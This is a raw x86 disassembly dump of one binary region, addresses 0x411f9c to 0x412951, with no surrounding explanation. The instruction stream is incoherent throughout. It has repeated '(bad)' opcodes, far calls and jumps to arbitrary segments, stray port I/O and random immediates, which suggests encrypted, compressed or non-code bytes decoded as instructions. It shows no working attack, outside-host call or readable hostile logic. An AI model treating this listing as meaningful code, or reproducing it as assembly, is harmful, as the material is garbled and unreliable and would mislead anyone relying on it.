  411f9c:	test   eax,0xa88f885d
  411fa1:	ss (bad) 
  411fa3:	aaa    
  411fa4:	and    al,0xb8
  411fa6:	mov    esi,0x92690904
  411fab:	fwait
  411fac:	loope  0x411f74
  411fae:	aam    0x91
  411fb0:	and    edi,edi
  411fb2:	in     al,dx
  411fb3:	mov    al,ds:0xcb221328
  411fb8:	pop    ebx
  411fb9:	not    BYTE PTR [ecx]
  411fbb:	jge    0x412021
  411fbd:	das    
  411fbe:	in     al,dx
  411fbf:	add    dh,BYTE PTR [edi+edi*2-0x85270f6]
  411fc6:	(bad)  
  411fc7:	mov    al,BYTE PTR [esi+0x1637260f]
  411fcd:	mov    edx,0x4563bcd7
  411fd2:	shl    DWORD PTR [esi+0x4c9f3891],cl
  411fd8:	call   0x55a1:0xb3df1999
  411fdf:	aad    0x51
  411fe1:	loop   0x411fa6
  411fe3:	xchg   ecx,eax
  411fe4:	enter  0xbfe7,0xdc
  411fe8:	add    eax,0x773cbbb9
  411fed:	or     ebp,eax
  411fef:	js     0x411fb9
  411ff1:	fsubrp st(4),st
  411ff3:	fs aaa 
  411ff5:	mov    dh,0x68
  411ff7:	jle    0x41200b
  411ff9:	stc    
  411ffa:	(bad)  
  411ffb:	mov    dh,0xde
  411ffd:	loopne 0x412026
  411fff:	cmp    BYTE PTR [esi+edx*8-0x314b0d72],bh
  412006:	test   DWORD PTR [edx+edx*8+0x1d79c4dc],ebp
  41200d:	xor    eax,0x5b3845d3
  412012:	xchg   ah,ch
  412014:	and    esp,edi
  412016:	push   ss
  412017:	mov    ds:0x902b743b,eax
  41201c:	xchg   edi,esi
  41201e:	in     al,dx
  41201f:	jl     0x412006
  412021:	xchg   edi,eax
  412022:	xor    ebx,DWORD PTR [ebx+esi*4-0x5a]
  412026:	loop   0x412028
  412028:	adc    bh,BYTE PTR [eax-0x1118174a]
  41202e:	push   esp
  41202f:	leave  
  412030:	and    eax,0x7a82e293
  412035:	lahf   
  412036:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412037:	mov    esp,0x568713ed
  41203c:	adc    esp,eax
  41203e:	aas    
  41203f:	shl    cl,0xb9
  412042:	inc    eax
  412043:	shl    bh,0xad
  412046:	(bad)  
  412047:	out    0xc4,al
  412049:	sbb    ch,bl
  41204b:	dec    eax
  41204c:	enter  0x3ece,0x3e
  412050:	jge    0x411ff5
  412052:	cld    
  412053:	dec    edx
  412054:	inc    esp
  412055:	imul   BYTE PTR ss:[ebx-0x17]
  412059:	pusha  
  41205a:	xchg   ecx,eax
  41205b:	jne    0x412008
  41205d:	mov    eax,ds:0xcaeae238
  412062:	imul   eax,DWORD PTR [ebp+0x46],0x368de7e1
  412069:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41206b:	dec    edx
  41206c:	dec    eax
  41206d:	hlt    
  41206e:	mov    ah,0x3e
  412070:	jg     0x412056
  412072:	or     al,0x5c
  412074:	stos   BYTE PTR es:[edi],al
  412075:	pop    es
  412076:	ja     0x412076
  412078:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412079:	test   ebx,0xb2f65dd
  41207f:	push   esp
  412080:	pop    eax
  412081:	mov    esi,0x66ab2e57
  412086:	jne    0x4120d7
  412088:	xchg   edi,eax
  412089:	pop    ss
  41208a:	stos   DWORD PTR es:[edi],eax
  41208b:	and    eax,0x7da9b4c0
  412090:	fnclex 
  412092:	mov    BYTE PTR [ebx-0x171911a4],dl
  412098:	ss jge 0x41205d
  41209b:	mov    edi,0x9dea98f5
  4120a0:	adc    esp,edx
  4120a2:	inc    ebx
  4120a3:	xchg   ecx,eax
  4120a4:	aad    0x77
  4120a6:	mov    WORD PTR [ebx-0x3d],gs
  4120a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120aa:	ds ins DWORD PTR es:[edi],dx
  4120ac:	pop    edi
  4120ad:	jg     0x4120ec
  4120af:	cmp    ah,BYTE PTR [edx-0x7613af18]
  4120b5:	cdq    
  4120b6:	xor    al,0x17
  4120b8:	adc    al,0xd1
  4120ba:	lahf   
  4120bb:	out    dx,eax
  4120bc:	das    
  4120bd:	sbb    BYTE PTR [edx],cl
  4120bf:	mov    edx,0x534cd58
  4120c4:	fwait
  4120c5:	retf   
  4120c6:	dec    ebp
  4120c7:	xchg   DWORD PTR [esi-0x72],esp
  4120ca:	mov    ecx,0x42df72d6
  4120d0:	xchg   esp,eax
  4120d1:	dec    edi
  4120d2:	lea    edi,[ebx]
  4120d4:	scas   al,BYTE PTR es:[edi]
  4120d5:	mov    dh,0x82
  4120d7:	out    dx,al
  4120d8:	shl    DWORD PTR [edx-0x2d],cl
  4120db:	mov    dl,0x61
  4120dd:	ds in  al,dx
  4120df:	xlat   BYTE PTR ds:[ebx]
  4120e0:	jns    0x41213c
  4120e2:	popf   
  4120e3:	push   ebp
  4120e4:	fdivr  QWORD PTR [edx+0x7dc692ff]
  4120ea:	aad    0xb3
  4120ec:	nop
  4120ed:	mov    dl,0x2c
  4120ef:	daa    
  4120f0:	sub    al,0xe1
  4120f2:	repnz push ss
  4120f4:	mov    cl,0xb4
  4120f6:	je     0x412120
  4120f8:	fild   DWORD PTR [eax+0x25cbba65]
  4120fe:	out    0x40,eax
  412100:	add    DWORD PTR [ecx+0x29],ebx
  412103:	fisubr WORD PTR [eax+0x6d2b7ec]
  412109:	ins    DWORD PTR es:[edi],dx
  41210a:	fcmovne st,st(6)
  41210c:	fiadd  WORD PTR [ebp+edx*4-0x60898594]
  412113:	fild   WORD PTR [ebx+0x1e3467fa]
  412119:	jg     0x41211c
  41211b:	push   edx
  41211c:	push   esp
  41211d:	lds    ebx,FWORD PTR [eax+0x64e73f55]
  412123:	sub    dl,BYTE PTR ds:[edx-0x5a]
  412127:	push   ss
  412128:	gs sahf 
  41212a:	xor    ecx,0x6
  41212d:	test   ecx,eax
  41212f:	dec    eax
  412130:	dec    ebx
  412131:	push   es
  412132:	cmp    ecx,ebp
  412134:	adc    al,0x47
  412136:	ins    BYTE PTR es:[edi],dx
  412137:	jne    0x412117
  412139:	adc    ebp,0x6f2677e3
  41213f:	les    eax,FWORD PTR [eax+eax*1+0x3e401db1]
  412146:	mov    cl,0xd8
  412148:	out    0xe2,eax
  41214a:	push   edi
  41214b:	int3   
  41214c:	out    0xd7,al
  41214e:	push   es
  41214f:	sub    edx,0xffffff80
  412152:	mov    ah,0xde
  412154:	pushf  
  412155:	sbb    eax,0x3a9ad155
  41215a:	mov    DWORD PTR [ebp+esi*8+0x72],ebx
  41215e:	jecxz  0x412167
  412160:	dec    ebx
  412161:	ja     0x412184
  412163:	push   ss
  412164:	jns    0x412120
  412166:	loope  0x41212f
  412168:	cdq    
  412169:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41216a:	sub    al,0x1
  41216c:	hlt    
  41216d:	push   edi
  41216e:	xor    BYTE PTR [edx+0x7915499],al
  412174:	out    0x43,eax
  412176:	hlt    
  412177:	js     0x412126
  412179:	adc    eax,0xd6a63c56
  41217e:	jae    0x4121d0
  412180:	not    eax
  412182:	sub    BYTE PTR [edi-0x4ddd3be0],dl
  412188:	xchg   esi,eax
  412189:	test   BYTE PTR [ebp*8-0x180caf21],ch
  412190:	(bad)  
  412191:	dec    ebp
  412192:	mov    ah,0x66
  412194:	addr16 jns 0x4121c4
  412197:	xchg   esi,eax
  412198:	ret    
  412199:	sbb    al,0xb7
  41219b:	add    al,0x9e
  41219d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41219e:	push   ebx
  41219f:	pop    ds
  4121a0:	push   ds
  4121a1:	push   cs
  4121a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121a3:	arpl   dx,bp
  4121a5:	sar    DWORD PTR [edi],1
  4121a7:	push   ss
  4121a8:	and    BYTE PTR [esp+ebp*2],bh
  4121ab:	adc    DWORD PTR [ebx+ebp*4+0x6daafc5c],edx
  4121b2:	adc    ah,ch
  4121b4:	dec    esi
  4121b5:	es cmp ecx,edi
  4121b8:	data16 mov dh,0x62
  4121bb:	push   0xffffff86
  4121bd:	jae    0x412160
  4121bf:	(bad)  
  4121c0:	and    BYTE PTR [esi],bl
  4121c2:	fwait
  4121c3:	dec    ecx
  4121c4:	cmp    DWORD PTR ds:0x4909ee12,ebp
  4121ca:	jne    0x4121bc
  4121cc:	xor    ecx,DWORD PTR [ebp-0x4155ae52]
  4121d2:	cmp    al,0x53
  4121d4:	xchg   edx,eax
  4121d5:	test   al,0x4e
  4121d7:	sahf   
  4121d8:	(bad)  
  4121d9:	js     0x412234
  4121db:	xchg   ebx,eax
  4121dc:	or     bh,al
  4121de:	inc    ecx
  4121df:	cmp    edx,DWORD PTR [eax+0x6ad94e00]
  4121e5:	inc    ecx
  4121e6:	xor    BYTE PTR [ecx+0x7cab630a],ah
  4121ec:	mov    eax,0xbfc65a74
  4121f1:	add    DWORD PTR [esi-0x18048048],0xdb41da7e
  4121fb:	jnp    0x412200
  4121fd:	in     al,dx
  4121fe:	dec    esi
  4121ff:	add    DWORD PTR [esi+0x5e68f319],0x7ae7c47d
  412209:	and    edx,DWORD PTR [esi-0x3b]
  41220c:	push   eax
  41220d:	or     ebp,DWORD PTR [ebx-0x4a009a63]
  412213:	pop    esp
  412214:	mov    ebx,DWORD PTR [ebx+ebx*2-0x69]
  412218:	or     dl,BYTE PTR [edx]
  41221a:	push   ds
  41221b:	jp     0x412227
  41221d:	pop    ss
  41221e:	cmp    BYTE PTR [esi],cl
  412220:	add    dl,BYTE PTR [edi-0x428a471]
  412226:	xchg   edi,eax
  412227:	xor    esp,DWORD PTR [esi]
  412229:	(bad)  
  41222a:	mov    WORD PTR [eax+0x3a],?
  41222d:	ins    DWORD PTR es:[edi],dx
  41222e:	xchg   esi,eax
  41222f:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412231:	scas   eax,DWORD PTR es:[edi]
  412232:	sbb    BYTE PTR [esp+ebx*4-0x4a],dh
  412236:	sbb    ebp,DWORD PTR [esi]
  412238:	loope  0x4121f8
  41223a:	repz xchg edx,eax
  41223c:	xchg   esp,eax
  41223d:	sub    cl,ah
  41223f:	enter  0x610e,0x84
  412243:	add    edi,DWORD PTR ss:[edx-0x35]
  412247:	add    esi,DWORD PTR [esi]
  412249:	dec    edx
  41224a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41224b:	jmp    0x993148e1
  412250:	inc    edx
  412251:	and    bh,al
  412253:	adc    DWORD PTR [edx+0x38],ecx
  412256:	dec    eax
  412257:	xchg   edx,eax
  412258:	shr    BYTE PTR [eax+0x16],cl
  41225b:	sub    DWORD PTR [edi],eax
  41225d:	xchg   edx,eax
  41225e:	jbe    0x4121fe
  412260:	cli    
  412261:	jge    0x4122d4
  412263:	mov    eax,ds:0x124649ce
  412268:	inc    cx
  41226a:	xor    eax,0x6e49c76f
  41226f:	mov    ds:0x6d27c9b,eax
  412274:	sbb    esp,DWORD PTR [ecx+0x54]
  412277:	mov    bl,0x95
  412279:	cmp    eax,0x2d071730
  41227e:	lahf   
  41227f:	icebp  
  412280:	sti    
  412281:	ret    
  412282:	jmp    0x5c5b:0x2a86c13e
  412289:	xlat   BYTE PTR ds:[ebx]
  41228a:	mov    ecx,DWORD PTR [eax-0x6417d6a3]
  412290:	or     al,BYTE PTR [ebx]
  412292:	stos   BYTE PTR es:[edi],al
  412293:	(bad)  [ebp+eiz*2-0x5ef18549]
  41229a:	mov    bh,BYTE PTR [edx-0x13f2c85b]
  4122a0:	in     eax,0x5d
  4122a2:	add    ecx,eax
  4122a4:	jae    0x41228d
  4122a6:	or     esp,DWORD PTR [ecx+edx*2]
  4122a9:	aad    0x2c
  4122ab:	daa    
  4122ac:	rol    BYTE PTR [esi-0xd542cf3],1
  4122b2:	loope  0x4122f1
  4122b4:	clc    
  4122b5:	mov    WORD PTR [esi+0x79bc55e3],gs
  4122bb:	xchg   esp,eax
  4122bc:	sbb    al,0x9c
  4122be:	xlat   BYTE PTR ds:[ebx]
  4122bf:	mov    esi,0xa6a9abdc
  4122c4:	mov    BYTE PTR [ecx-0x651857d8],bl
  4122ca:	loop   0x412320
  4122cc:	(bad)  
  4122cd:	and    DWORD PTR gs:[edi+0x39],ebx
  4122d1:	push   edx
  4122d2:	inc    ebp
  4122d3:	mov    dh,0xd3
  4122d5:	xchg   ecx,eax
  4122d6:	push   edi
  4122d7:	cdq    
  4122d8:	jl     0x412332
  4122da:	scas   eax,DWORD PTR es:[edi]
  4122db:	sub    ebp,ecx
  4122dd:	fdiv   st,st(4)
  4122df:	nop
  4122e0:	aas    
  4122e1:	into   
  4122e2:	sbb    dh,BYTE PTR [esi-0x5513318c]
  4122e8:	push   ebx
  4122e9:	mov    cl,0x8c
  4122eb:	fmul   QWORD PTR [ebx+0x65]
  4122ee:	inc    ebp
  4122ef:	mov    ss,WORD PTR [ebx]
  4122f1:	dec    BYTE PTR [edx]
  4122f3:	aam    0x95
  4122f5:	sub    eax,0x8ce3267b
  4122fa:	sub    bh,BYTE PTR [edx-0x1b]
  4122fd:	int3   
  4122fe:	xchg   esi,eax
  4122ff:	jle    0x4122ae
  412301:	ror    DWORD PTR [eax-0x6dfe6fc4],cl
  412307:	clc    
  412308:	mov    ds:0xe553cd35,al
  41230d:	pop    ebx
  41230e:	dec    edi
  41230f:	mov    ds:0xff795039,al
  412314:	test   DWORD PTR [edi+0x5d],edx
  412317:	add    DWORD PTR [eax+0x43],ebp
  41231a:	push   0xf8fd1f8e
  41231f:	aas    
  412320:	por    mm6,QWORD PTR [ebx-0x4b]
  412324:	scas   al,BYTE PTR es:[edi]
  412325:	adc    DWORD PTR [eax+0x31],0xad3c5900
  41232c:	adc    eax,0x484c40cf
  412331:	in     al,dx
  412332:	out    0xeb,al
  412334:	mov    ecx,0xfd521856
  412339:	clc    
  41233a:	js     0x41231f
  41233c:	das    
  41233d:	xor    eax,0xaabe9889
  412342:	or     edi,DWORD PTR [edi-0x20]
  412345:	repnz adc ebp,DWORD PTR [edi-0x2645f53]
  41234c:	pop    esp
  41234d:	sub    ebx,DWORD PTR [ebx+0x66]
  412350:	dec    esp
  412351:	push   ebp
  412352:	jno    0x412302
  412354:	sti    
  412355:	cmp    BYTE PTR [esi+0x53],0x28
  412359:	push   ecx
  41235a:	or     DWORD PTR [ebp+0x7c],0xd4be8d0b
  412361:	test   BYTE PTR [edi],ch
  412363:	add    ah,BYTE PTR [edi+0x5eb3a5ff]
  412369:	jmp    0x2582f42b
  41236e:	jo     0x4123c5
  412370:	ins    DWORD PTR es:[edi],dx
  412371:	jg     0x412393
  412373:	sahf   
  412374:	or     bh,bl
  412376:	sahf   
  412377:	and    BYTE PTR [ebp+0x31afa1d0],0xf1
  41237e:	fs icebp 
  412380:	idiv   ah
  412382:	into   
  412383:	in     eax,0x97
  412385:	dec    edi
  412386:	inc    eax
  412387:	push   ecx
  412388:	js     0x41232b
  41238a:	jl     0x412369
  41238c:	cmp    edi,ebx
  41238e:	xchg   ebp,ecx
  412390:	(bad)  
  412391:	jmp    0x412331
  412393:	inc    esp
  412394:	retf   0x9341
  412397:	xlat   BYTE PTR ds:[ebx]
  412398:	push   ebp
  412399:	mov    DWORD PTR [ecx-0x79],ebp
  41239c:	sub    DWORD PTR [edx-0x3d],edi
  41239f:	inc    esp
  4123a0:	iret   
  4123a1:	sbb    bh,BYTE PTR [ebp-0x67c65f2c]
  4123a7:	or     cl,cl
  4123a9:	xor    al,0x34
  4123ab:	dec    edi
  4123ac:	jbe    0x4123ab
  4123ae:	inc    edi
  4123af:	daa    
  4123b0:	push   es
  4123b1:	aam    0xb
  4123b3:	test   al,0x73
  4123b5:	sbb    DWORD PTR ds:0xfc7d0969,edi
  4123bb:	sbb    BYTE PTR [ebx-0x23],dh
  4123be:	jns    0x412367
  4123c0:	mov    dl,0x80
  4123c2:	pcmpgtd mm1,QWORD PTR [ecx-0x67b86cee]
  4123c9:	enter  0x3c86,0x5b
  4123cd:	ret    0xe5a9
  4123d0:	pop    edx
  4123d1:	jp     0x412445
  4123d3:	dec    esi
  4123d4:	push   edx
  4123d5:	or     al,0x0
  4123d7:	mov    ecx,0xc7eb0de0
  4123dc:	xor    eax,0x12c23017
  4123e1:	call   0x1669c87a
  4123e6:	pop    ecx
  4123e7:	or     dl,BYTE PTR [ecx]
  4123e9:	adc    eax,ecx
  4123eb:	pop    edx
  4123ec:	retf   
  4123ed:	(bad)  
  4123ee:	daa    
  4123ef:	xchg   edi,eax
  4123f0:	dec    esi
  4123f1:	mov    esi,0x2601012
  4123f6:	fst    DWORD PTR [eax-0x3f]
  4123f9:	es push 0x65b200da
  4123ff:	xchg   ebx,eax
  412400:	mov    edi,0xbf397774
  412405:	sbb    BYTE PTR [eax],al
	...
  4125db:	add    BYTE PTR [eax],al
  4125dd:	add    BYTE PTR [esp+ebp*2],bl
  4125e0:	ins    DWORD PTR es:[edi],dx
  4125e1:	les    edi,FWORD PTR [ebp-0x3b]
  4125e4:	mov    ebp,0x7e8bcdfc
  4125e9:	jae    0x41256f
  4125eb:	ret    0x8fd2
  4125ee:	mov    ebx,0x1e00013d
  4125f3:	pop    es
  4125f4:	add    BYTE PTR [eax],al
  4125f6:	call   0x18abbdc5
  4125fb:	dec    esp
  4125fc:	jmp    0x2bb4:0xbf8b7d5d
  412603:	mov    ds:0xdb64d8a8,al
  412608:	(bad)  
  412609:	push   cs
  41260a:	call   0x98dd:0xfc417e35
  412611:	pusha  
  412612:	mov    esp,eax
  412614:	(bad)  
  412615:	shl    BYTE PTR [ebp+0x11],cl
  412618:	rcr    DWORD PTR [edi],1
  41261a:	fs in  eax,0xac
  41261d:	dec    ebp
  41261e:	addr16 xor al,0xfe
  412621:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412622:	call   0x6c07:0x4987a4d7
  412629:	clc    
  41262a:	ds sahf 
  41262c:	inc    ebp
  41262d:	cmc    
  41262e:	mov    al,0x53
  412630:	aam    0x5
  412632:	jmp    0x76c:0x9fe4c46
  412639:	pop    ss
  41263a:	ins    DWORD PTR es:[edi],dx
  41263b:	(bad)  
  41263c:	out    dx,eax
  41263d:	popf   
  41263e:	mov    al,0x7d
  412640:	lods   al,BYTE PTR ds:[esi]
  412641:	jae    0x4126ad
  412643:	mov    ch,0x98
  412645:	or     DWORD PTR [ebx-0x17],0x5a
  412649:	rcr    DWORD PTR [eax-0x4f],1
  41264c:	mov    esp,0xda0400b9
  412651:	fadd   DWORD PTR [ebp-0xcc2d396]
  412657:	dec    esp
  412658:	lock push 0x92804cc5
  41265e:	test   eax,0xa5c154a4
  412663:	sbb    DWORD PTR [edx-0x43e340ef],edi
  412669:	cmp    DWORD PTR ds:0xf0316653,esi
  41266f:	add    BYTE PTR [esi+0x2437d0e5],bl
  412675:	push   ebp
  412676:	enter  0x5564,0xe0
  41267a:	loop   0x41267f
  41267c:	rcl    BYTE PTR [ecx+0x731538b9],0x5c
  412683:	inc    esi
  412684:	push   eax
  412685:	aam    0xcb
  412687:	(bad)  [ecx]
  412689:	test   esp,edx
  41268b:	xchg   ebp,eax
  41268c:	ror    BYTE PTR [ebp+0x2739b407],0x45
  412693:	pop    ebp
  412694:	ins    DWORD PTR es:[edi],dx
  412695:	xor    al,0x35
  412697:	mov    DWORD PTR gs:[eax+eax*4],ebx
  41269b:	mov    al,0xa6
  41269d:	pop    ebp
  41269e:	ins    DWORD PTR es:[edi],dx
  41269f:	cwde   
  4126a0:	cmp    eax,0xa644250b
  4126a5:	push   ebx
  4126a6:	mov    WORD PTR [edi+0x48cac61d],gs
  4126ac:	clc    
  4126ad:	outs   dx,DWORD PTR ds:[esi]
  4126ae:	push   ebx
  4126af:	mov    esp,0xc017a032
  4126b4:	push   edx
  4126b5:	mov    DWORD PTR [edx+0x22bfb817],ecx
  4126bb:	jnp    0x41268b
  4126bd:	pop    ebx
  4126be:	gs xchg ebp,eax
  4126c0:	jl     0x62bc1166
  4126c6:	rcl    DWORD PTR [ebp-0x6c253f5],0x6
  4126cd:	cmp    bh,BYTE PTR [ecx]
  4126cf:	cli    
  4126d0:	jns    0x41266f
  4126d2:	repz adc eax,0x5223a466
  4126d8:	aam    0x33
  4126da:	imul   edi,DWORD PTR [esi],0x71ce3a79
  4126e0:	cdq    
  4126e1:	add    BYTE PTR [ebp-0x484593c9],ah
  4126e7:	(bad)  
  4126ea:	loope  0x41271a
  4126ec:	jo     0x4126f3
  4126ee:	adc    BYTE PTR [eax-0x16],bh
  4126f1:	pop    esi
  4126f2:	fbld   TBYTE PTR [eax+0x6a]
  4126f5:	jg     0x4126e1
  4126f7:	mov    cl,0xa7
  4126f9:	cmp    al,0xf0
  4126fb:	push   0x887f5e32
  412700:	adc    bh,BYTE PTR cs:[ebp+0x335a7f01]
  412707:	add    al,dh
  412709:	adc    al,BYTE PTR [ebp+0x61]
  41270c:	pop    ds
  41270d:	pusha  
  41270e:	imul   ebx,DWORD PTR [edx-0x62],0xf4038ea4
  412715:	adc    DWORD PTR [edi+edx*4-0x3d3c7637],edi
  41271c:	pushf  
  41271d:	cmp    bh,dh
  41271f:	inc    ebx
  412720:	pusha  
  412721:	lods   al,BYTE PTR ds:[esi]
  412722:	mov    ds:0xc81bca9f,eax
  412727:	mov    al,ds:0xf30cf522
  41272c:	lds    ecx,FWORD PTR ds:0x110f021c
  412732:	mov    eax,ds:0x2fe96c3f
  412737:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412738:	ins    DWORD PTR es:[edi],dx
  412739:	es into 
  41273b:	push   ebx
  41273c:	mov    ebp,0xb1c7e14
  412741:	nop
  412742:	rcr    DWORD PTR [esi-0x20],cl
  412745:	enter  0xd7df,0xe7
  412749:	and    DWORD PTR [ebp+0x2cb485fe],ebp
  41274f:	into   
  412750:	cmp    al,ch
  412752:	shl    eax,1
  412754:	jo     0x4127b8
  412756:	cmp    bl,BYTE PTR [esi-0x73175d9e]
  41275c:	or     al,0x44
  41275e:	or     bl,al
  412760:	push   edi
  412761:	les    ebx,FWORD PTR [edi+0x4a]
  412764:	pusha  
  412765:	adc    dl,bh
  412767:	jns    0x412700
  412769:	vpshad xmm9,xmm7,xmm7
  41276e:	inc    esi
  41276f:	test   BYTE PTR ds:[ebp-0x7c35c2b9],dl
  412776:	xlat   BYTE PTR ds:[ebx]
  412777:	pop    ebx
  412778:	jmp    0x67ba:0x681346c3
  41277f:	xchg   esp,eax
  412780:	out    0xf2,al
  412782:	xor    dl,bl
  412784:	jmp    0xb6257c55
  412789:	dec    edi
  41278a:	or     eax,0xb886ad27
  41278f:	in     al,dx
  412790:	mov    bl,0x7f
  412792:	add    al,0x6c
  412794:	clc    
  412795:	or     al,0xc5
  412797:	mov    al,0xa6
  412799:	ret    
  41279a:	and    al,0xa1
  41279c:	in     al,dx
  41279d:	mov    esi,?
  41279f:	jle    0x4127ce
  4127a1:	inc    eax
  4127a2:	cmp    ah,bh
  4127a4:	dec    ebx
  4127a5:	cmp    BYTE PTR [edi-0x53e820f3],cl
  4127ab:	adc    ecx,DWORD PTR [edi-0x7ef09e0c]
  4127b1:	cmp    eax,ebx
  4127b3:	lods   eax,DWORD PTR ds:[esi]
  4127b4:	stos   DWORD PTR es:[edi],eax
  4127b5:	pop    ecx
  4127b6:	sar    BYTE PTR [eax+0x24],cl
  4127b9:	mov    edx,DWORD PTR [esp]
  4127bc:	outs   dx,BYTE PTR ds:[esi]
  4127bd:	xchg   esp,eax
  4127be:	or     al,0x6d
  4127c0:	push   ss
  4127c1:	add    BYTE PTR [eax+0x5bc22306],bl
  4127c7:	pop    ds
  4127c8:	sub    cl,BYTE PTR [edi+0x11]
  4127cb:	mov    ebp,ebx
  4127cd:	pop    edx
  4127ce:	aaa    
  4127cf:	add    eax,0x9319cd66
  4127d4:	fdiv   DWORD PTR [edx]
  4127d6:	sar    DWORD PTR [ebx-0x75e7828d],1
  4127dc:	xor    BYTE PTR [edx+0x2f13cef6],al
  4127e2:	jmp    0x412858
  4127e4:	lds    eax,FWORD PTR [ebp+0x16e02953]
  4127ea:	(bad)  
  4127eb:	add    ch,BYTE PTR es:[ecx-0x6]
  4127ef:	bound  ebx,QWORD PTR [edi-0x1]
  4127f2:	dec    ebp
  4127f3:	gs pop ds
  4127f5:	test   DWORD PTR [eax+0x1b7f53e],eax
  4127fb:	je     0x4127f9
  4127fd:	cmp    al,0xb3
  4127ff:	sub    bl,BYTE PTR ds:0x83301ff1
  412805:	ins    BYTE PTR es:[edi],dx
  412806:	push   0x40
  412808:	inc    esi
  412809:	idiv   BYTE PTR [ebp-0x174d9f84]
  41280f:	leave  
  412810:	repnz sub DWORD PTR [eax],edi
  412813:	stos   BYTE PTR es:[edi],al
  412814:	inc    ebp
  412815:	cmc    
  412816:	jmp    0x412895
  412818:	mov    bl,0x19
  41281a:	repz sub eax,0xabe9cf1f
  412820:	pop    eax
  412821:	dec    ebp
  412822:	add    al,BYTE PTR [edi]
  412824:	les    ebp,FWORD PTR [esi+edx*8-0x3f9e5cfc]
  41282b:	pop    ss
  41282c:	xchg   ecx,eax
  41282d:	dec    esp
  41282e:	xchg   edx,eax
  41282f:	(bad)  
  412830:	lods   al,BYTE PTR ds:[esi]
  412831:	div    DWORD PTR [ebx+0x4b]
  412834:	xchg   esp,eax
  412835:	push   0x4da7c2e1
  41283a:	shl    BYTE PTR [esi-0x1f],0xf9
  41283e:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412840:	sahf   
  412841:	test   eax,0xb5350443
  412846:	stos   BYTE PTR es:[edi],al
  412847:	nop
  412848:	or     DWORD PTR [esi],ebp
  41284a:	stos   DWORD PTR es:[edi],eax
  41284b:	inc    ecx
  41284c:	add    eax,ebp
  41284e:	cwde   
  41284f:	(bad)  
  412850:	cmp    bl,bl
  412852:	pop    ebx
  412853:	sub    ecx,DWORD PTR [edx-0x3b]
  412856:	mov    al,ds:0x6caf25de
  41285b:	or     eax,0xb5b6aff0
  412860:	dec    ecx
  412861:	xchg   ecx,eax
  412862:	lahf   
  412863:	inc    eax
  412864:	push   ecx
  412865:	mov    edi,ebx
  412867:	ror    WORD PTR ss:[esi-0x68521480],cl
  41286f:	loope  0x412895
  412871:	rcr    BYTE PTR [edi-0x44],1
  412874:	lahf   
  412875:	jp     0x412848
  412877:	mov    al,ds:0x903ae0b0
  41287c:	xor    BYTE PTR [ebx+0x16],bl
  41287f:	mov    ah,0x8b
  412881:	pop    esp
  412882:	jb     0x412844
  412884:	pop    ecx
  412885:	sar    DWORD PTR [eax+0x4bdebd41],0x10
  41288c:	jbe    0x412862
  41288e:	ss out 0xd1,al
  412891:	push   esi
  412892:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412893:	add    DWORD PTR [esi+0x65],edi
  412896:	mov    ch,BYTE PTR [ebx+0x45]
  412899:	jle    0x412918
  41289b:	jmp    0x41283a
  41289d:	ret    0x292d
  4128a0:	push   ebx
  4128a1:	retf   0x8a8f
  4128a4:	js     0x412884
  4128a6:	ja     0x4128c2
  4128a8:	fstp   st(5)
  4128aa:	lods   eax,DWORD PTR ds:[esi]
  4128ab:	sbb    al,BYTE PTR [edx-0x4e]
  4128ae:	pop    esi
  4128af:	retf   0x4d61
  4128b2:	(bad)  
  4128b3:	icebp  
  4128b4:	mov    dh,0xa2
  4128b6:	mov    ds:0xc36e2179,al
  4128bb:	clc    
  4128bc:	sbb    eax,0x995aa469
  4128c1:	adc    BYTE PTR [esi+esi*2+0x72],0xe9
  4128c6:	mov    ebp,0xd9d5ba2e
  4128cb:	and    bh,dl
  4128cd:	les    ecx,FWORD PTR [eax]
  4128cf:	mov    esp,eax
  4128d1:	test   DWORD PTR [eax],ebp
  4128d3:	sub    BYTE PTR [edx-0x9d4ba36],ch
  4128d9:	and    edi,DWORD PTR [esi-0x4c81e13c]
  4128df:	hlt    
  4128e0:	lods   eax,DWORD PTR ds:[esi]
  4128e1:	sar    BYTE PTR [ebp+0x78],1
  4128e4:	dec    edx
  4128e5:	jnp    0x41291e
  4128e7:	dec    ecx
  4128e8:	aad    0xe9
  4128ea:	push   esp
  4128eb:	inc    eax
  4128ec:	adc    ebp,DWORD PTR [eax+ebp*2]
  4128ef:	int    0x5b
  4128f1:	fsub   QWORD PTR [ecx+0x1b]
  4128f4:	leave  
  4128f5:	dec    esi
  4128f6:	pop    eax
  4128f7:	mov    ah,0x71
  4128f9:	pop    ebp
  4128fa:	cmp    BYTE PTR [ebx],dh
  4128fc:	add    BYTE PTR [edx+esi*1],0x92
  412900:	cmp    BYTE PTR [ebx+0x22],cl
  412903:	or     esi,DWORD PTR [ebp+0x2418b766]
  412909:	mov    cl,0xe2
  41290b:	fstp   DWORD PTR [eax+0x182a42f1]
  412911:	pop    esi
  412912:	(bad)  
  412913:	pop    edi
  412914:	jge    0x4128b9
  412916:	ror    dh,1
  412918:	iret   
  412919:	fs mov eax,fs:0xdd003b31
  412920:	add    al,0xe7
  412922:	jns    0x4129a0
  412924:	shr    BYTE PTR [esi],1
  412926:	xchg   BYTE PTR [ebx+0x61],bl
  412929:	and    cl,BYTE PTR [edx+0x40]
  41292c:	stc    
  41292d:	jg     0x41298f
  41292f:	push   es
  412930:	xor    al,0x53
  412932:	clc    
  412933:	mov    edi,0xffe65f67
  412938:	and    BYTE PTR [ecx+0x5d],dh
  41293b:	xchg   esp,eax
  41293c:	ja     0x4129ad
  41293e:	inc    edx
  41293f:	call   0x5882:0xd66a9bd0
  412946:	pop    es
  412947:	push   ebp
  412948:	jg     0x412944
  41294a:	jae    0x41291c
  41294c:	ret    
  41294d:	inc    esi
  41294e:	into   
  41294f:	add    BYTE PTR [eax],ah
  412951:	mov    ah,0x3d
